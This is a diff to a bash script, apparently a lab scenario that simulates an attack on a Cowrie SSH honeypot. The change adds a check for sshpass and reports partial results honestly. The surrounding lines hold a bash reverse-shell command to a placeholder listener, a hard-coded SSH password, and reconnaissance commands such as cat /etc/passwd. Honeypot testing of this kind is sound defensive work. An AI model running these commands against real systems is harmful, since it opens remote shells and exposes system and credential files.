@@ -34,6 +34,11 @@ bash -i >& /dev/tcp/'"$LHOST"'/'"$LPORT"' 0>&1' > "$EVIDENCE_DIR/reverse_shell.s
 
 # 2. Conexión SSH al honeypot y ejecución de comandos sospechosos
 echo "[*] Fase 2: SSH a Cowrie con credenciales y ejecución de reverse shell"
+if ! command -v sshpass >/dev/null 2>&1; then
+    echo "[!] sshpass no esta instalado: no habra conexion SSH real" | tee -a "$EVIDENCE_DIR/ssh_attempt.log"
+    echo "[!] Escenario incompleto: Cowrie no registrara este intento" | tee -a "$EVIDENCE_DIR/ssh_attempt.log"
+    TOOLS_FALTANTES="sshpass"
+fi
 sshpass -p "test123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
     -p $HONEYPOT_PORT admin@$HONEYPOT_HOST \
     "echo 'intento de reverse shell...'; cat /etc/passwd; ls -la /tmp/; whoami; uname -a" \
@@ -81,4 +86,8 @@ cat > "$EVIDENCE_DIR/resultados.json" <<EOF
 }
 EOF
 
-echo "[OK] Escenario S09 ejecutado. Cowrie capturó los intentos."
+if [ -n "${TOOLS_FALTANTES:-}" ]; then
+    echo "[PARCIAL] Escenario S09 ejecutado con herramientas ausentes: $TOOLS_FALTANTES"
+else
+    echo "[OK] Escenario S09 ejecutado. Cowrie capturó los intentos."
+fi
